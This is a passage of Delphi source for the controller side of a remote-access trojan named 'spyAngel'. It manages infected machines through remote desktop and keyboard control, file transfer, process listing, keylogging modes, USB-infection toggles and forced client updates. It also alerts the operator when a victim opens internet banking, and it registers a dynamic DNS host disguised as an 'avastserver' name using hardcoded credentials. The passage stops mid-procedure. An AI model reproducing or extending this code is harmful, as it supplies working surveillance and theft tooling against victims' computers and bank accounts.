{$IMAGEBASE 61234589}  {Altera o cabeçalho do Software}
unit Principal;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, Winsock,
  Dialogs, ExtCtrls, StdCtrls, Menus, ComCtrls, ScktComp, Lh5Unit, StreamManager,
  AppEvnts, IdTCPConnection, IdTCPClient, IdHTTP, ShellApi, Vcl.ImgList, DefineDados,
  Zlib, IdContext, IOutils, IdTelnet, IdBaseComponent, IdComponent, IdCmdTCPClient, DateUtils, Registry, UPNP,
  System.ImageList;
type
  TSock_Thread = class(TThread)
  private
    Socket: TCustomWinSocket;
  public
    constructor Create(aSocket: TCustomWinSocket);
    procedure Execute; override;
  end;

type
  TSock_Thread2 = class(TThread)
  private
    Socket: TCustomWinSocket;
  public
    constructor Create(aSocket: TCustomWinSocket);
    procedure Execute; override;
  end;

type
  TSock_Thread4 = class(TThread)
  private
    Socket: TCustomWinSocket;
  public
    ID: String;
    constructor Create(aSocket: TCustomWinSocket);
    procedure Execute; override;
  end;

type
  TForm1 = class(TForm)
    StatusBar1: TStatusBar;
    PopupMenu1: TPopupMenu;
    Fecharconexo1: TMenuItem;
    N1: TMenuItem;
    FecharConexo2: TMenuItem;
    SS1: TServerSocket;
    Timer1: TTimer;
    GerenciadordeArquivos1: TMenuItem;
    Chato1: TMenuItem;
    processos: TMenuItem;
    LV1: TListView;
    ImageList1: TImageList;
    MainMenu1: TMainMenu;
    Arquivo1: TMenuItem;
    Logout1: TMenuItem;
    Sair1: TMenuItem;
    Opes1: TMenuItem;
    GridLines1: TMenuItem;
    Sobre1: TMenuItem;
    btnInit: TMenuItem;
    contatarErro: TMenuItem;
    Credito: TMenuItem;
    idioma: TMenuItem;
    Ptbr: TMenuItem;
    English: TMenuItem;
    Spanish1: TMenuItem;
    statusbar: TMenuItem;
    Contato: TMenuItem;
    teclado: TMenuItem;
    Exec: TMenuItem;
    N2: TMenuItem;
    N3: TMenuItem;
    TrayIcon1: TTrayIcon;
    Ocultaraofechar: TMenuItem;
    ApplicationEvents1: TApplicationEvents;
    PopupMenu2: TPopupMenu;
    Sair2: TMenuItem;
    Mostrar: TMenuItem;
    Logout2: TMenuItem;
    VPN2: TMenuItem;
    DesativarUsbInfect1: TMenuItem;
    OpenDialog1: TOpenDialog;
    Desativado1: TMenuItem;
    ModoTimer1: TMenuItem;
    ModoKeyHook1: TMenuItem;
    ReceberDados1: TMenuItem;
    Desativar1: TMenuItem;
    Ativar1: TMenuItem;
    Outros1: TMenuItem;
    Desligar1: TMenuItem;
    Logoff1: TMenuItem;
    Reiniciar: TMenuItem;
    Cliente1: TMenuItem;
    EditarCliente1: TMenuItem;
    AutoAtualiza: TMenuItem;
    TerminalIRC: TMenuItem;
    ProgressBar1: TProgressBar;
    Timer2: TTimer;
    Descriptografar1: TMenuItem;
    Timer3: TTimer;
    HTTP1: TIdHTTP;
    IdTelnet1: TIdTelnet;
    procedure Fecharconexo1Click(Sender: TObject);
    procedure SS1ClientError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure SS1Listen(Sender: TObject; Socket: TCustomWinSocket);
    procedure SS1Accept(Sender: TObject; Socket: TCustomWinSocket);
    procedure SS1ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure Timer1Timer(Sender: TObject);
    procedure FecharConexo2Click(Sender: TObject);
    procedure GerenciadordeArquivos1Click(Sender: TObject);
    procedure ApplicationEvents1Exception(Sender: TObject; E: Exception);
    procedure Chato1Click(Sender: TObject);
    procedure processosClick(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure FormShow(Sender: TObject);
    procedure Sair1Click(Sender: TObject);
    procedure Logout1Click(Sender: TObject);
    procedure GridLines1Click(Sender: TObject);
    procedure btnInitClick(Sender: TObject);
    procedure contatarErroClick(Sender: TObject);
    procedure CreditoClick(Sender: TObject);
    procedure statusbarClick(Sender: TObject);
    procedure ContatoClick(Sender: TObject);
    procedure LV1ColumnClick(Sender: TObject; Column: TListColumn);
    procedure LV1Compare(Sender: TObject; Item1, Item2: TListItem; Data: Integer; var Compare: Integer);
    procedure TrayIcon1DblClick(Sender: TObject);
    procedure Logout2Click(Sender: TObject);
    procedure Sair2Click(Sender: TObject);
    procedure MostrarClick(Sender: TObject);
    procedure OcultaraofecharClick(Sender: TObject);
    procedure PtbrClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure atualizaXML();
    procedure VPN2Click(Sender: TObject);
    procedure EditarCliente1Click(Sender: TObject);
    procedure ReceberDados1Click(Sender: TObject);
    procedure Outros1Click(Sender: TObject);
    procedure Logoff1Click(Sender: TObject);
    procedure Desligar1Click(Sender: TObject);
    procedure ReiniciarClick(Sender: TObject);
    procedure AutoAtualizaClick(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure Descriptografar1Click(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
    procedure Desativado1Click(Sender: TObject);
    procedure ModoTimer1Click(Sender: TObject);
    procedure ModoKeyHook1Click(Sender: TObject);
    procedure Ativar1Click(Sender: TObject);
    procedure Desativar1Click(Sender: TObject);
    procedure Logout();
  private
    { Private declarations }
  public
    L: TListItem;
    porta: Integer;
    IdUser:String;
    { Public declarations }
  end;

var
  Form1: TForm1;
  NewAppVersao, NewApp: String;
  ColIndex: Integer = 0;
  Ok : Boolean = True;
  OrdAscCol : Boolean = True;
  ArquivoEnviar: TMemoryStream;

implementation

uses Desktop_Remoto, File_Manager, Chat, Wprocessos, login, vpn;

Constructor TSock_Thread.Create(aSocket: TCustomWinSocket);
begin
  inherited Create(true);
  Socket := aSocket;
  FreeOnTerminate := true;
end;

Constructor TSock_Thread2.Create(aSocket: TCustomWinSocket);
begin
  inherited Create(true);
  Socket := aSocket;
  FreeOnTerminate := true;
end;

Constructor TSock_Thread4.Create(aSocket: TCustomWinSocket);
begin
  inherited Create(true);
  Socket := aSocket;
  FreeOnTerminate := true;
end;

{$R *.dfm}
{$SETPEFlAGS IMAGE_FILE_DEBUG_STRIPPED or IMAGE_FILE_LINE_NUMS_STRIPPED or
 IMAGE_FILE_LOCAL_SYMS_STRIPPED OR IMAGE_FILE_RELOCS_STRIPPED}

{$WEAKLINKRTTI ON}
{$RTTI EXPLICIT METHODS([]) PROPERTIES([]) FIELDS([])}

function SysTempDir: string;
begin
  SetLength(Result, MAX_PATH);
  if GetTempPath(MAX_PATH, PChar(Result)) > 0 then
  Result := string(PChar(Result))
  else
  Result := '';
end;

function SecondsIdle: Boolean;
var
   liInfo: TLastInputInfo;
begin
   liInfo.cbSize := SizeOf(TLastInputInfo) ;
   GetLastInputInfo(liInfo) ;
   if((((GetTickCount - liInfo.dwTime) DIV 1000)>888)and(((GetTickCount - liInfo.dwTime) DIV 1000)<950))then
    Result:=True
   else
    Result:=False;
end;
// Descomprime dados
function DeCompressStream(SrcStream: TMemoryStream): boolean;
var
  InputStream, OutputStream: TMemoryStream;
  inbuffer, outbuffer: Pointer;
  count, outcount: longint;
begin
  result := false;
  if not assigned(SrcStream) then
    exit;

  InputStream := TMemoryStream.Create;
  OutputStream := TMemoryStream.Create;
  try
    InputStream.LoadFromStream(SrcStream);
    count := InputStream.Size;
    getmem(inbuffer, count);
    InputStream.ReadBuffer(inbuffer^, count);
    Zlib.ZDecompress(inbuffer, count, outbuffer, outcount);
    OutputStream.Write(outbuffer^, outcount);
    SrcStream.Clear;
    SrcStream.LoadFromStream(OutputStream);
    result := true;
  finally
    InputStream.Free;
    OutputStream.Free;
    FreeMem(inbuffer, count);
    FreeMem(outbuffer, outcount);
  end;
end;

function LocalIP : string;
type
  TaPInAddr = array [0..10] of PInAddr;
  PaPInAddr = ^TaPInAddr;
var
  phe : PHostEnt;
  pptr : PaPInAddr;
  Buffer : String;
  I : Integer;
  GInitData : TWSADATA;
begin
  WSAStartup($101, GInitData);
  Result := '';
  gethostname(PAnsiChar(Buffer),SizeOf(Buffer));
  phe :=GetHostByName(PAnsiChar(Buffer));
  if phe = nil then Exit;
  pptr := PaPInAddr(Phe^.h_addr_list);
  I := 0;
  while pptr^[I] <> nil do begin
    result:=inet_ntoa(pptr^[I]^);
    Inc(I);
  end;
  WSACleanup;
end;

procedure TForm1.Logout();
begin
  TUPNP_PortMap.remove(porta, 'TCP');
  Ok:=True;
  Form1.LV1.Enabled := false;
  Form1.btnInit.Caption := 'Ativar';
  Form1.SS1.Active := false;
  Form1.Hide;
  Form0.StatusBar1.Panels.Items[1].Text := 'Você foi desconectado!';
  Form0.Show;

end;

procedure TrimAppMemorySize;
var MainHandle : THandle;
begin
try
  MainHandle := OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessID) ;
  SetProcessWorkingSetSize(MainHandle, $FFFFFFFF, $FFFFFFFF) ;
  CloseHandle(MainHandle) ;
  Application.ProcessMessages;
except
end;
end;
// Descomprime dados
procedure ExpandStream(inStream, outStream: TStream);
const
  BufferSize = 4096;
var
  count: Integer;
  ZStream: TZDecompressionStream;
  Buffer: array [0 .. BufferSize - 1] of Byte;
begin
  ZStream := TZDecompressionStream.Create(inStream);
  try
    while true do
    begin
      count := ZStream.Read(Buffer, BufferSize);
      if count <> 0 then
        outStream.WriteBuffer(Buffer, count)
      else
        Break;
    end;
  finally
    ZStream.Free;
  end;
end;

// Thread principal, onde será definido onde a conexão será de informações, Desktop Remoto, Teclado Remoto, Baixar e Enviar arquivos.
procedure TSock_Thread.Execute;
var
  s, s2: String;
  L: TListItem;
  TamanhoFile: Integer;
//  ArquivoEnviar: TMemoryStream;
  TSTPrincipal: TSock_Thread2;
  TSTDownload: TSock_Thread4;
  Desktop: TForm2;
  FileManager: TForm3;
begin
  inherited;

  while not Terminated and Socket.Connected do
  begin
    if Socket.ReceiveLength > 0 then
    begin
      s := Socket.ReceiveText;

      if Pos('<|PRINCIPAL|>', s) > 0 then
      begin
        TSTPrincipal := TSock_Thread2.Create(Socket);
        TSTPrincipal.Resume;
        Socket.SendText('<|OK|>');
        Destroy;
      end;

      if Pos('<|Desktop|>', s) > 0 then
      begin
        Form1.LV1.Selected.SubItems.Objects[1] := TObject(Socket);
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Remoto :=
          TRemoto.Create(true);
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Remoto.Socket
          := Socket;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Remoto.Resume;
        Destroy;
      end;

      if Pos('<|KEYBOARD|>', s) > 0 then
      begin
        s2 := s;
        Delete(s2, 1, Pos('<|KEYBOARD|>', s2) + 11);

        s2 := Copy(s2, 1, Pos('<<|', s2) - 1);
        L := Form1.LV1.FindCaption(0, s2, false, true, false);
        if L <> nil then
          (L.SubItems.Objects[2] as TForm2).Socket2 := Socket;
        Destroy;
      end;

      if Pos('<|DOWNLOAD|>', s) > 0 then
      begin
        s2 := s;
        Delete(s2, 1, Pos('<|DOWNLOAD|>', s2) + 11);

        s2 := Copy(s2, 1, Pos('<<|', s2) - 1);

        TSTDownload := TSock_Thread4.Create(Socket);
        TSTDownload.ID := s2;
        TSTDownload.Resume;
        Sleep(1000);
        Socket.SendText('<|OK|>');
        Destroy;
      end;

      if Pos('<|UPLOAD|>', s) > 0 then
      begin
        s2 := s;
        Delete(s2, 1, Pos('<|UPLOAD|>', s2) + 9);
        s2 := Copy(s2, 1, Pos('<<|', s2) - 1);

        L := Form1.LV1.FindCaption(0, s2, false, true, false);
        if L <> nil then
        begin
          (L.SubItems.Objects[4] as TForm3).ProgressBar2.Max :=(L.SubItems.Objects[4] as TForm3).ArquivoEnviar.Size;
          Socket.SendText('<|Size|>' + intToStr((L.SubItems.Objects[4] as TForm3).ArquivoEnviar.Size) + #0);
          Socket.SendStream((L.SubItems.Objects[4] as TForm3).ArquivoEnviar);
          (L.SubItems.Objects[4] as TForm3).Timer1.Enabled := true;
        end;
        Destroy;
      end;

      if Pos('<|UPLOAD2|>', s) > 0 then
      begin
        s2 := s;
        Delete(s2, 1, Pos('<|UPLOAD2|>', s2) + 10);
        s2 := Copy(s2, 1, Pos('<<|', s2) - 1);
        L := Form1.LV1.FindCaption(0, s2, false, true, false);
        if L <> nil then
        begin
          ArquivoEnviar := TMemoryStream.Create;
          ArquivoEnviar.LoadFromFile(NewApp);
          Form1.ProgressBar1.Max:=ArquivoEnviar.Size;
          Socket.SendText('<|Size|>' + intToStr(ArquivoEnviar.Size) + #0);
          Socket.SendStream(ArquivoEnviar);
          Form1.Timer2.Enabled := True;
        end;
        Destroy;
      end;
    end;
    Sleep(10);
  end;
end;

procedure TSock_Thread2.Execute;
var
  s, s2, pcname, SO, user, Senha, isDesktop, AppVersao: String;
  L, L2: TListItem;
  ping1, ping2, i: Integer;
  Lista: TStrings;
begin
  inherited;

  Socket.SendText('<|SocketMain|>' + intToStr(Socket.Handle) + '<<|');
  while not Terminated and Socket.Connected do
  begin
    if Socket.ReceiveLength > 0 then
    begin
      s := Socket.ReceiveText;

      if Pos('<|Info|>', s) > 0 then
      begin
        s2 := s;

        Delete(s2, 1, Pos('<|Info|>', s2) + 7);
        pcname := Copy(s2, 1, Pos('<|>', s2) - 1);

        Delete(s2, 1, Pos('<|>', s2) + 2);
        isDesktop := Copy(s2, 1, Pos('<|>', s2) - 1);

        Delete(s2, 1, Pos('<|>', s2) + 2);
        SO := Copy(s2, 1, Pos('<|>', s2) - 1);

        Delete(s2, 1, Pos('<|>', s2) + 2);
        user := Copy(s2, 1, Pos('<|>', s2) - 1);

        Delete(s2, 1, Pos('<|>', s2) + 2);
        AppVersao := Copy(s2, 1, Pos('<|>', s2) - 1);

        Delete(s2, 1, Pos('<|>', s2) + 2);
        Senha := Copy(s2, 1, Pos('<<|', s2) - 1);

        if Senha = '' then
        begin
          if (Form1.Active=False)then
            FlashWindow(Application.Handle, true);
          Form1.TrayIcon1.BalloonHint:=pcname+' conectou-se!';
          Form1.TrayIcon1.ShowBalloonHint;
          L := Form1.LV1.Items.Add;
          L.Caption := intToStr(Socket.Handle);
          L.SubItems.Add(pcname);
          if(isDesktop='True')then
            L.SubItemImages[1]:=1
          else
            L.SubItemImages[1]:=2;
          L.SubItems.Add(SO);
          L.SubItems.Add(user);
          L.SubItems.Add(Socket.RemoteAddress);
          L.SubItems.Add('...');
          L.SubItems.Add(' ');
          L.SubItems.Add(' ');
          L.SubItems.Objects[0] := TObject(Socket);
        end
        else
          Socket.SendText('<|NOSenha|>');
      end;
      if Pos('<|PONG|>', s) > 0 then
      begin
        L := Form1.LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
        ping1 := Integer(L.SubItems.Objects[5]);
        ping2 := GetTickCount - ping1;
        if(ping2<=800)then
          L.SubItemImages[4]:=3{4 barras}
        else if(ping2<=1800)then
            L.SubItemImages[4]:=4 {3 barras}
          else if(ping2<=2800)then
              L.SubItemImages[4]:=5 {2 barras}
            else if(ping2<=3800)then
                L.SubItemImages[4]:=6 {1 barra}
              else
                L.SubItemImages[4]:=7; {0 barra}
        L.SubItems[4] := intToStr(ping2);
      end;
      // Chat
      if Pos('<|Chat|>', s) > 0 then
      begin
        s2 := s;
        Delete(s2, 1, Pos('<|Chat|>', s2) + 7);

        s2 := Copy(s2, 1, Pos('<<|', s2) - 1);

        (L.SubItems.Objects[6] as TForm4).Memo2.Lines.Add(s2);
        (L.SubItems.Objects[6] as TForm4).Memo2.Lines.Add(' ');
        FlashWindow(Application.Handle, true);
      end;

      if Pos('<|CloseChat|>', s) > 0 then
      begin
        if L.SubItems.Objects[6] <> nil then
        begin
          (L.SubItems.Objects[6] as TForm4)
            .Memo2.Lines.Add('-- Usuário fechou o Chat --');
          (L.SubItems.Objects[6] as TForm4).Memo2.Lines.Add(' ');
          (L.SubItems.Objects[6] as TForm4).Memo1.Enabled := false;
        end;
      end;

      {VPN_}
      if Pos('<|vpn|>', s) > 0 then
      begin
        s2 := s;
        Delete(s2, 1, Pos('<|vpn|>', s2) + 6);
        s2 := Copy(s2, 1, Pos('<<|', s2) - 1);
        L2 := Form1.LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
        (L2.SubItems.Objects[4] as TForm6).Memo1.Lines.Text:=s2;
      end;

       // Gerenciador de processos
      if Pos('<|Processos|>', s) > 0 then
      begin
        s2 := s;
        Delete(s2, 1, Pos('<|Processos|>', s2) + 9);
        s2 := Copy(s2, 1, Pos('<<|', s2) - 1);
        Lista := TStringList.Create;
        Lista.Text := s2;
        L2 := Form1.LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
        (L2.SubItems.Objects[4] as TForm5).ListView1.Clear;
        for i := 2 to Lista.count - 1 do
        begin
          L := (L2.SubItems.Objects[4] as TForm5).ListView1.Items.Add;
          Sleep(10);
          L.Caption := Lista.Strings[i];
        end;
        Lista.Free;
      end;

      // Gerenciador de Arquivos
      if Pos('<|Fold|>', s) > 0 then
      begin
        s2 := s;
        Delete(s2, 1, Pos('<|Fold|>', s2) + 7);
        s2 := Copy(s2, 1, Pos('<<|', s2) - 1);
        Lista := TStringList.Create;
        Lista.Text := s2;
        L2 := Form1.LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
        (L2.SubItems.Objects[4] as TForm3).ListView1.Clear;
        for i := 0 to Lista.count - 1 do
        begin
          L := (L2.SubItems.Objects[4] as TForm3).ListView1.Items.Add;
          L.ImageIndex := 0;
          Sleep(10);
          L.Caption := Lista.Strings[i];
          L.SubItems.Add('Pasta');
          if pos('.gswhidden',L.Caption)>0 then begin
            s2:=L.Caption;
            Delete(s2, Pos('.gswhidden', s2), s2.Length-1);
            L.Caption:=s2;
            L.ImageIndex := 2;
          end;
        end;
        Lista.Free;
        Socket.SendText('<|Files|>' + (L2.SubItems.Objects[4] as TForm3).Edit1.Text + '<<|');
      end;

      if Pos('<|Files|>', s) > 0 then
      begin
        s2 := s;
        Delete(s2, 1, Pos('<|Files|>', s2) + 8);
        s2 := Copy(s2, 1, Pos('<<|', s2) - 1);
        Lista := TStringList.Create;
        Lista.Text := s2;
        for i := 0 to Lista.count - 1 do
        begin
          L2 := Form1.LV1.FindCaption(0, intToStr(Socket.Handle), false,true, false);
          L := (L2.SubItems.Objects[4] as TForm3).ListView1.Items.Add;
          L.ImageIndex := 1;
          Sleep(10);
          L.Caption := Lista.Strings[i];
          if pos('.exe',L.Caption)>0 then
            L.SubItems.Add('Executável')
          else if pos('.rar',L.Caption)>0 then
            L.SubItems.Add('WinRar')
          else if pos('.zip',L.Caption)>0 then
            L.SubItems.Add('WinZip')
          else if pos('.mp3',L.Caption)>0 then
            L.SubItems.Add('MP3')
          else if pos('.doc',L.Caption)>0 then
            L.SubItems.Add('Word Doc')
          else if pos('.docx',L.Caption)>0 then
            L.SubItems.Add('Word DocX')
          else if pos('.pdf',L.Caption)>0 then
            L.SubItems.Add('PDF')
          else
            L.SubItems.Add('Arquivo');

          if pos('.gswhidden',L.Caption)>0 then begin
            s2:=L.Caption;
            Delete(s2, Pos('.gswhidden', s2), s2.Length-1);
            L.Caption:=s2;
            L.ImageIndex := 3;
          end;
        end;
        Lista.Free;
      end;

      if Pos('<|ProgressUP|>', s) > 0 then
      begin
        s2 := s;
        Delete(s, 1, Pos('<|ProgressUP|>', s) + 13);
        s2 := Copy(s2, 1, Pos('<<|', s2) - 1);
        (L2.SubItems.Objects[4] as TForm3).ProgressBar2.Position :=strToInt(s2);
      end;

      if Pos('<|textbbb|>', s) > 0 then begin
        Form1.TrayIcon1.BalloonHint:=pcname+' entrou no internet_bnk!';
        Form1.TrayIcon1.ShowBalloonHint;
      end;

      if ((Pos('<|Enviado|>', s) > 0)or(Pos('<|AtualizarC|>', s) > 0)) then begin
        (L2.SubItems.Objects[4] as TForm3).ProgressBar2.Position := 0;
        Socket.SendText('<|Fold|>' + (L2.SubItems.Objects[4] as TForm3).Edit1.Text + '<<|');
        Application.MessageBox('Arquivo enviado com sucesso!', 'Aviso', 64);
      end;
      if Pos('<|AtualizarC2|>', s) > 0 then begin
        Form1.ProgressBar1.Position:=0;
        Form1.Timer2.Enabled:=False;
      end;
      //Auto Atualizar cliente
      if((Form1.AutoAtualiza.Checked=True)and
        (CompareDate(StrToDate(NewAppVersao),StrToDate(AppVersao))=1)and
        (FileExists(NewApp))and
        (Form1.Timer2.Enabled=False))then begin
          Socket.SendText('<|AtualizarC2|>' +ExtractFileName(NewApp) + '<<|');
          AppVersao:=NewAppVersao;
        end;
    end;
    Sleep(10);
  end;
end;
// Download de arquivo
procedure TSock_Thread4.Execute;
var
  s: string;
  stSize: Integer;
  Stream: TMemoryStream;
  Receiving: Boolean;
  L: TListItem;
begin
  inherited;
  While not Terminated and Socket.Connected do
  begin
    if Socket.ReceiveLength > 0 then
    begin
      L := Form1.LV1.FindCaption(0, ID, false, true, false);
      s := Socket.ReceiveText;
      if not Receiving then
      begin
        if Pos(#0, s) > 0 then
        begin
          stSize := strToInt(Copy(s, 1, Pos(#0, s) - 1));
          (L.SubItems.Objects[4] as TForm3).ProgressBar1.Max := stSize;
        end
        else
          exit;
        Stream := TMemoryStream.Create;
        Receiving := true;
        Delete(s, 1, Pos(#0, s));
      end;
      try
        Stream.Write(AnsiString(s)[1], length(s));
        (L.SubItems.Objects[4] as TForm3).ProgressBar1.Position := Stream.Size;
        if Stream.Size = stSize then
        begin
          Stream.Position := 0;
          Receiving := false;
          Stream.SaveToFile((L.SubItems.Objects[4] as TForm3).LocalSalvar);
          Stream.Free;
          (L.SubItems.Objects[4] as TForm3).ProgressBar1.Position := 0;
          Application.MessageBox('Arquivo baixado com sucesso!', 'Aviso', 64);
          Terminate;
        end;
      except
        Stream.Free;
      end;
    end;
    Sleep(10); // evita a CPU ficar em 100%
  end;
end;

procedure TForm1.Fecharconexo1Click(Sender: TObject);
var
  Desktop: TForm2;
  Socket: TCustomWinSocket;
begin
  if LV1.ItemIndex < 0 then
    exit;

  if LV1.Selected.SubItems.Objects[2] = nil then
  begin
    Desktop := TForm2.Create(self);
    LV1.Selected.SubItems.Objects[2] := TObject(Desktop);
    Desktop.Caption := 'spyAngel - Desktop Remoto de "' +
      LV1.Selected.SubItems[0] + '"';
    Desktop.Show;
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Desktop.Socket := Socket;
    Socket.SendText('<|first|>');
  end
  else if (LV1.Selected.SubItems.Objects[2] as TForm2).Visible = false then
  begin
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket := Socket;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Show;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket.SendText('<|first|>');
  end
end;

procedure TForm1.SS1ClientError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
  L := LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then
  begin
    if L.SubItems.Objects[2] <> nil then
    begin
      if Socket = (L.SubItems.Objects[2] as TForm2).Socket then
      begin
        (L.SubItems.Objects[2] as TForm2).Close;
      end;

      if Socket = (L.SubItems.Objects[4] as TForm3).Socket then
      begin
        (L.SubItems.Objects[4] as TForm3).Close;
      end;

      if Socket = (L.SubItems.Objects[6] as TForm4).Socket then
      begin
        (L.SubItems.Objects[6] as TForm4).Close;
      end;
    end;
    L.Delete;
  end;
end;

procedure TForm1.SS1Listen(Sender: TObject; Socket: TCustomWinSocket);
begin
  StatusBar1.Panels.Items[1].Text := 'Aguardando conexões na porta: ' + intToStr(SS1.Port);
  StatusBar1.Panels.Items[2].Text := 'IP Local: '+ LocalIP +'       ';
end;

procedure TForm1.Ativar1Click(Sender: TObject);
var Socket: TCustomWinSocket;
begin
  try
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Socket.SendText('<|usbon|><<|');
  except
    exit;
  end;
end;

procedure TForm1.atualizaXML();
var regi:TRegistry;
begin
  asm nop end;
  regi := TRegistry.Create;
  regi.rootKey := HKEY_CURRENT_USER;
  regi.OpenKey('Software\Conamy\AngelServer\Options', True);
  regi.WriteBool('status', statusbar.Checked);
  regi.WriteBool('hide', Ocultaraofechar.Checked);
  regi.WriteBool('grid', GridLines1.Checked);
  regi.CloseKey;
end;

procedure TForm1.AutoAtualizaClick(Sender: TObject);
var Arquivo:TFile;
begin
  if(AutoAtualiza.Checked=True)then
    AutoAtualiza.Checked:=False
  else
  if OpenDialog1.Execute then begin
    NewAppVersao:=datetostr(Arquivo.GetCreationTime(OpenDialog1.FileName));
    NewApp:=OpenDialog1.FileName;
    AutoAtualiza.Checked:=True;
  end else
    AutoAtualiza.Checked:=False;
end;

procedure TForm1.statusbarClick(Sender: TObject);
begin
  if(Statusbar1.Visible=False)then
    Statusbar1.Visible:=True
  else
    Statusbar1.Visible:=False;
  atualizaXML;
end;

procedure TForm1.Sair1Click(Sender: TObject);
begin
Application.Terminate;
end;

procedure TForm1.Sair2Click(Sender: TObject);
begin
  Application.Terminate;
end;

procedure TForm1.SS1Accept(Sender: TObject; Socket: TCustomWinSocket);
var
  TST: TSock_Thread;
begin
  TST := TSock_Thread.Create(Socket);
  TST.Resume;
end;

procedure TForm1.SS1ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  L := LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then
  begin
    if L.SubItems.Objects[2] <> nil then
    begin
      if Socket = (L.SubItems.Objects[2] as TForm2).Socket then
      begin
        (L.SubItems.Objects[2] as TForm2).Close;
      end;

      if Socket = (L.SubItems.Objects[4] as TForm3).Socket then
      begin
        (L.SubItems.Objects[4] as TForm3).Close;
      end;

      if Socket = (L.SubItems.Objects[6] as TForm4).Socket then
      begin
        (L.SubItems.Objects[6] as TForm4).Close;
      end;
    end;
    L.Delete;
  end;
end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
  i: Integer;
  Socket: TCustomWinSocket;
begin
  try
    for i := 0 to LV1.Items.count - 1 do
    begin
      Socket := TCustomWinSocket(Form1.LV1.Items.Item[i].SubItems.Objects[0]);
      Form1.LV1.Items.Item[i].SubItems.Objects[5] := TObject(GetTickCount);
      Socket.SendText('<|PING|>');
    end;
  except
    Form1.LV1.Items.Delete(i);
  end;
end;

procedure TForm1.Timer2Timer(Sender: TObject);
begin
  try
    ProgressBar1.Position := ArquivoEnviar.Position;
//    if(ProgressBar2.Position=100)then begin
  //    ArquivoEnviar.Clear;
    //end;
  except
    ProgressBar1.Position := 0;
//    ArquivoEnviar.Clear;
    Timer2.Enabled := False;
  end;
end;

procedure TForm1.Timer3Timer(Sender: TObject);
begin
  if(SecondsIdle)then
    TrimAppMemorySize;
end;

procedure TForm1.TrayIcon1DblClick(Sender: TObject);
begin
  if(form1.Visible=False)then begin
    Form1.Show();
    Application.BringToFront;
  end;
end;

procedure TForm1.VPN2Click(Sender: TObject);
var
  formvpn: TForm6;
  Sock: TCustomWinSocket;
begin
 if LV1.ItemIndex < 0 then
    exit;

  if ((LV1.Selected.SubItems.Objects[4] = nil)or(LV1.Selected.SubItems.Objects[4]<>TObject(formvpn)))then
  begin
    formvpn := TForm6.Create(self);
    formvpn.Caption := 'spyAngel - Conexão VPN com "' + LV1.Selected.SubItems[0] + '"';
    formvpn.Show;
    LV1.Selected.SubItems.Objects[4] := TObject(formvpn);

    Sock := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    formvpn.Socket := Sock;
    formvpn.Socket.SendText('<|vpn|>conect<<|');
  end
  else
  begin
    (LV1.Selected.SubItems.Objects[4] as TForm6).Show;
  end;
end;

procedure TForm1.FecharConexo2Click(Sender: TObject);
var
  Socket: TCustomWinSocket;
begin
  Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
  Socket.SendText('<|Close|>');
  LV1.Selected.Delete;
end;

procedure TForm1.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  CanClose:=false;
  if(Ocultaraofechar.Checked=True)then begin
    Form1.Hide;
    Mostrar.Caption:='Mostrar';
  end else begin
    Logout();
  end;
end;

procedure TForm1.FormCreate(Sender: TObject);
var regi:TRegistry;
begin
  regi := TRegistry.Create;
  regi.rootKey := HKEY_CURRENT_USER;
  if(regi.OpenKeyReadOnly('Software\Conamy\AngelServer\Options'))then begin
    statusbar.Checked:=regi.ReadBool('status');
    Statusbar1.Visible:=statusbar.Checked;
    GridLines1.Checked:=regi.ReadBool('grid');
    LV1.GridLines:=GridLines1.Checked;
    Ocultaraofechar.Checked:=regi.ReadBool('hide');
//    idioma.Items(regi.ReadInteger('language')).Checked:=True;
  end;
  regi.CloseKey;
end;

procedure TForm1.FormShow(Sender: TObject);
var IPext: String;
begin
  Mostrar.Caption:='Ocultar';
  if(Form1.TrayIcon1.Visible=False)then
    Form1.TrayIcon1.Visible:=True;
  Form1.LV1.Enabled := true;
  Form1.btnInit.Caption := 'Desativar';
  Form1.SS1.Port := porta;
  Form1.SS1.Active := true;
  if(Ok)then begin
    TUPNP_PortMap.add(true, porta, porta, LocalIP, 'TCP', 'Angel');
    try
      IPext:=idTelnet1.ConnectAndGetAll;
      Delete(IPext,1,pos(':',IPext)+1);
      HTTP1.Get('http://kodels2:123qwe.@dynupdate.no-ip.com/nic/update?hostname=avastserver.webhop.me&myip='+IPext);
    finally
      HTTP1.Disconnect;
      Ok:=False;
    end;
  end;
end;

procedure TForm1.GerenciadordeArquivos1Click(Sender: TObject);
var
  Compartilhador: TForm3;
begin
  if LV1.ItemIndex < 0 then
    exit;

  if ((LV1.Selected.SubItems.Objects[4] = nil)or(LV1.Selected.SubItems.Objects[4]<>TObject(Compartilhador)))then
  begin
